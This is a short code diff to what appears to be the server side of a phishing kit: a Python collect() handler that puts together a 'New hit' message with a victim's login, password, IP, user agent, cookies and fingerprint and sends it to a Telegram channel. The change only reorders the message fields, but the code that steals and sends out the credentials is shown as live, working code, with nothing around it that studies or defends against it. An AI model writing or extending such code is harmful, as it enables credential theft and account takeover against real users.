@@ -44,10 +44,10 @@ def collect():
     
     now = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
     
-    msg = f"""🚨 <b>New hit</b>
-    🔑 <b>Login:</b> <code>{login}</code>
-🔒 <b>Password:</b> <code>{password}</code>
+   msg = f"""🚨 <b>New hit</b>
 ⏰ {now}
+🔑 <b>Login:</b> <code>{login}</code>
+🔒 <b>Password:</b> <code>{password}</code>
 🌐 <b>IP:</b> <code>{ip}</code>
 📱 <b>UA:</b> <code>{ua[:200]}</code>
 🖥 <b>Screen:</b> {screen}
@@ -58,7 +58,6 @@ def collect():
 📎 <b>Referer:</b> {ref}
 🍪 <b>Cookies:</b> <code>{str(cookies)[:250]}</code>
 🧬 <b>FP:</b> <code>{fp}</code>"""
-
     
     send_to_tg(msg)
     return jsonify({"ok": True})
